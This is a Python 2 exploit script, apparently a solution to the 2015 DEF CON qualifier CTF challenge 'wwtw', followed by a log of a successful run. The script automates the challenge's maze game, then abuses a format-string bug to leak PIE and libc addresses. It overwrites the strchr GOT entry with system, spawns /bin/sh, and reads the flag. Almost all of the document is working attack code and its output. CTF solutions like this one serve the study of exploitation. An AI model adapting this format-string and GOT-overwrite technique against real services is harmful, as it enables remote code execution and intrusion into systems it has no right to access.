#!/usr/bin/python
# -*- coding: utf-8 -*-
# bug was found by mage and me
# exploit was written by bata_24
# (originally from http://pastebin.com/x2z1KgqW)

import struct, socket, sys, telnetlib, random, time
import libformatstr

def sock(remoteip="127.0.0.1", remoteport=1234):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((remoteip, remoteport))
  return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
  data = ''
  while not data.endswith(delim):
    data += f.read(1)
  return data

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

def countdown(n):
  sys.stdout.flush()
  for i in xrange(n,0,-1):
    print str(i) + "..",
    sys.stdout.flush()
    time.sleep(1)
  print
  return

if sys.argv[1] == 'r':
  # HOST, PORT = "wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me", 2606
  # offset_system  = 0x40190  # x86
  # offset_binsh   = 0x160a24 # x86
  HOST, PORT = "localhost", 2606
  offset_system  = 0x40190  # x86
  offset_binsh   = 0x160a24 # x86
else:
  # HOST, PORT = "192.168.164.134", 2606
  HOST, PORT = "localhost", 2606
  offset_system  = 0x40190  # x86
  offset_binsh   = 0x160a24 # x86
offset_got_strchr = 0x505c

def move():
  read_until(f, "   012345678901234567890\n")[:-1]
  field = []
  for i in xrange(20):
    line = read_until(f)[3:-1]
    for j in xrange(len(line)):
      if line[j] in ['V', '<', '>', '^']:
        ux = j
        uy = i
      if line[j] in ['E', 'T']:
        ex = j
        ey = i
    field.append(line)
  #print '\n'.join(field)
  print "@=(%d,%d)"%(ux,uy), "E=(%d,%d)"%(ex,ey)
  read_until(f, "Your move (w,a,s,d,q):")

  cand = ""
  if ux-ex > 0 and field[uy][ux-1] != 'A':
    cand += 'a'
  elif ux-ex < 0 and field[uy][ux+1] != 'A':
    cand += 'd'
  if uy-ey > 0 and field[uy-1][ux] != 'A':
    cand += 'w'
  elif uy-ey < 0 and field[uy+1][ux] != 'A':
    cand += 's'
  
  #print "[+] cand=", cand, 
  if cand == "":
    print "[-] game failed..."
    return False
  c = cand[random.randrange(0,len(cand))]
  #print "c=", c
  f.write(c+"\n")
  if c == 'a': ux-=1
  elif c == 'd': ux+=1
  elif c == 'w': uy-=1
  elif c == 's': uy+=1
 
  if ux == ex and uy == ey:
    global stage
    print "[+] stage %d clear"%stage
    stage += 1
  return True

s, f = sock(HOST, PORT)
stage = 0
while True:
  if stage > 4:
    break
  if move() == False:
    stage = 0
    s, f = sock(HOST, PORT)

f.write("UeSlhCAGEp\n")
print read_until(f, "Selection: ")
f.write("11111111\x00")
if sys.argv[1] == 'r':
  print read_until(f, "Selection: ")
  countdown(3)
  f.write("m+YU\n")
  f.write("11111111\x00")
f.write("33333333\x00")
print read_until(f, "Coordinates: ")

print "[+] 51.492137, -0.192878"
#f.write("51.492137, -0.192878 :" + ':'.join(["%"+str(x)+"$p" for x in range(240,280)]) + ":\n")
f.write("51.492137, -0.192878 :%225$p:%245$p:\n")
r = read_until(f, "Coordinates: ")
libc_base = int(r.split(':')[1],16) - 0xdac73
pie_base = int(r.split(':')[2],16) - 0x2fe9
print "pie_base", hex(pie_base)
print "libc_base", hex(libc_base)
libc_system = libc_base + offset_system
print "libc_system", hex(libc_system)

got_strchr = pie_base + offset_got_strchr
fsb = libformatstr.FormatStr()
fsb[got_strchr] = libc_system - 0x160016
f.write("51.492137, -0.192878 :" + fsb.payload(21, len("51.492137, -0.192878 :")) + "\n")
read_until(f, "Coordinates: ")
f.write("/bin/sh;\x00\n")

shell(s)

"""
@=(2,7) E=(0,15)
@=(2,8) E=(0,15)
@=(1,8) E=(0,15)
@=(0,8) E=(0,15)
@=(0,9) E=(0,15)
@=(0,10) E=(0,15)
@=(0,11) E=(0,15)
@=(0,12) E=(0,15)
@=(0,13) E=(0,15)
@=(0,14) E=(0,15)
[+] stage 0 clear
@=(0,15) E=(12,19)
@=(0,16) E=(12,19)
@=(1,16) E=(12,19)
@=(1,17) E=(12,19)
@=(1,18) E=(12,19)
@=(1,19) E=(12,19)
@=(2,19) E=(12,19)
@=(3,19) E=(12,19)
@=(4,19) E=(12,19)
@=(5,19) E=(12,19)
@=(6,19) E=(12,19)
@=(7,19) E=(12,19)
@=(8,19) E=(12,19)
@=(9,19) E=(12,19)
@=(10,19) E=(12,19)
@=(11,19) E=(12,19)
[+] stage 1 clear
@=(2,3) E=(0,0)
@=(1,3) E=(0,0)
@=(0,3) E=(0,0)
@=(0,2) E=(0,0)
@=(0,1) E=(0,0)
[+] stage 2 clear
@=(1,14) E=(16,19)
@=(1,15) E=(16,19)
@=(1,16) E=(16,19)
@=(1,17) E=(16,19)
@=(1,18) E=(16,19)
@=(1,19) E=(16,19)
@=(2,19) E=(16,19)
@=(3,19) E=(16,19)
@=(4,19) E=(16,19)
@=(5,19) E=(16,19)
@=(6,19) E=(16,19)
@=(7,19) E=(16,19)
@=(8,19) E=(16,19)
@=(9,19) E=(16,19)
@=(10,19) E=(16,19)
@=(11,19) E=(16,19)
@=(12,19) E=(16,19)
@=(13,19) E=(16,19)
@=(14,19) E=(16,19)
@=(15,19) E=(16,19)
[+] stage 3 clear
@=(1,4) E=(12,1)
@=(2,4) E=(12,1)
@=(3,4) E=(12,1)
@=(3,3) E=(12,1)
@=(4,3) E=(12,1)
@=(4,2) E=(12,1)
@=(4,1) E=(12,1)
@=(5,1) E=(12,1)
@=(6,1) E=(12,1)
@=(7,1) E=(12,1)
@=(8,1) E=(12,1)
@=(9,1) E=(12,1)
@=(10,1) E=(12,1)
@=(11,1) E=(12,1)
[+] stage 4 clear
 TARDIS KEY: Welcome to the TARDIS!
Your options are:
1. Turn on the console
2. Leave the TARDIS
Selection:
Access denied except between May 17 2015 23:59:40 GMT and May 18 2015 00:00:00 GMT
Your options are:
1. Turn on the console
2. Leave the TARDIS
Selection:
3.. 2.. 1..
Invalid
Your options are:
1. Turn on the console
2. Leave the TARDIS
Selection: The TARDIS console is online!Your options are:
1. Turn on the console
2. Leave the TARDIS
3. Dematerialize
Selection: Coordinates:
[+] 51.492137, -0.192878
pie_base 0xf7704000
libc_base 0xf752a000
libc_system 0xf756a190
id
uid=1001(wwtw) gid=1001(wwtw) groups=1001(wwtw)
cat /home/wwtw/flag
/bin/sh: 2: /home/wwtw/flag: Permission denied
cat /home/wwtw/f*
The flag is: Would you like a Jelly Baby? !@()*ASF)9UW$askjal
"""
